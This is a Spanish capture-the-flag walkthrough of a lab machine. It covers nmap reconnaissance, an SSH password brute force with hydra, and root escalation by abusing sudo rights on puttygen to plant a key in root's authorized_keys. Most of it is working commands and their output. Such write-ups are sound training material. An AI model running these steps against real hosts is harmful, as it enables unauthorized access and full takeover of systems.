# Reconocimiento

En primer lugar, con `netdiscover` vemos la IP de la máquina.

```zsh
netdiscover
	...                                                                     
 192.168.1.167
	...                                                                  

```
## IP Víctima
```
192.168.1.167
```


## Nmap
```zsh
nmap -p 0-65535 -T5 -A -sT -Pn -n 192.168.1.167 -oX scan.xml && xsltproc scan.xml -o scan.html
```

Escaneamos los puertos abiertos de la máquina y generamos un informe para visualizar en el navegador, lo abrimos con:

```
firefox scan.html
```

### Puertos
A priori, nada más allá de:
1. SSH en el puerto 22
2. Servidor HTTP por el 80


## Apache
Nada más entrar, si scrolleamos un poco hacia el final de la página, nos encontramos con este texto.
```
// Cambia la contraseña de ssh por favor melanie
```

Resulta lógico probar un ataque de fuerza bruta, y da resultados rápidamente.


## Hydra
```zsh
hydra -f -l melanie -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.1.167 -t 64 -I
	...
[22][ssh] host: 192.168.1.167   login: melanie   password: *****
[STATUS] attack finished for 192.168.1.167 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
	...
```



# Post explotación
Al entrar hacemos `sudo -l`, y vemos que tenemos privilegios root para ejecutar `puttygen`

```zsh
melanie@grillo:~$ sudo -l
	...
User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

De manera que está claro lo que hay que hacer: Generar una llave y ponerla en el archivo de llaves autorizadas del usuario `root`. Luego la descargamos en nuestra máquina y podremos autenticarnos como `root` sin necesidad de contraseña.

```zsh
melanie@grillo:~$ puttygen -t rsa -b 4096 -O private-openssh -o id_rsa ## Generamos la llave, -t es el tipo de llave, -b la cantidad de bytes de esta, -O el formato de output y -o el nombre del archivo de output
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++
Enter passphrase to save key: 
Re-enter passphrase to verify: ## Aquí se puede poner cualquier cosa 
melanie@grillo:~$ chmod 600 id_rsa ## Le damos permisos 600 para que nos deje utilizarla
melanie@grillo:~$ sudo puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh ## La cargamos aprovechando los privilegios root de puttygen al archivo de llaves autorizadas de root
```

Ahora, en nuestra máquina:

```zsh
scp melanie@192.168.1.167:/home/melanie/id_rsa . ## Descargamos la llave mediante scp

ssh -i id_rsa root@192.168.1.167 ## Nos conectamos por ssh como root
```

```zsh
Last login: Sun Apr 21 11:35:18 2024 from 192.168.0.100
root@grillo:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@grillo:~# cat /root/root.txt 
*****
root@grillo:~# 
```
